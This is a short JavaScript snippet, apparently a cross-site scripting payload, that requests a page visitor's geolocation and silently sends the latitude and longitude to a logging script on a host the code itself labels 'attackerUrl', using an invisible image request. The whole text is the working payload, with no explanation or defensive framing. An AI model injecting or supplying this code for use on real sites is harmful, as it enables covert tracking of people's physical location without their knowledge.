navigator.geolocation.getCurrentPosition(function(position) {
    var attackerUrl = 'https://192.168.0.10/log.php'
    var img = new Image();
    img.src = attackerUrl + '?data=' + encodeURIComponent(position.coords.latitude) +"-" +encodeURIComponent(position.coords.longitude);
      
});